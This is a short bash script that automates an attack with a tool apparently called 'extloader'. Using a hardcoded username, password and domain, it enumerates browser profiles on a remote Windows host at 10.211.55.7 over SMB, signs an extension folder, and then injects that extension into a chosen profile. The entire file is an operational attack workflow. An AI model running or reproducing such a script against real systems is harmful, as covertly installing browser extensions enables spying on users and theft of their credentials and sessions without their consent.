#####
# Automates: check profiles, sign extension, inject via SMB (extloader).
# Usage: ./exploit.sh <profile_index>   (run check first to list)
# Example: ./exploit.sh 0
# Vars: EXT, USER, PASSWORD, DOMAIN, TARGET
#####

EXT=./extensions/
USER=user
PASSWORD=password123
DOMAIN=WORKGROUP
TARGET=10.211.55.7

# Profile index to target (from script arg)
PROFILE_INDEX="$1"

# Require an index; suggest running the check step if missing
if [ -z "$PROFILE_INDEX" ]; then
  echo "Usage: $0 <profile_index>" >&2
  echo "Tip: extloader check -t \"$TARGET\" -u \"$USER\" -p \"$PASSWORD\" -d \"$DOMAIN\"" >&2
  exit 1
fi

# Clear cached targets
rm available_targets.json

# Check profiles on target
extloader check -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN

# Sign extension
extloader sign --extension $EXT

# Inject to selected profile index
extloader exploit -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN -i "$PROFILE_INDEX" --extension $EXT
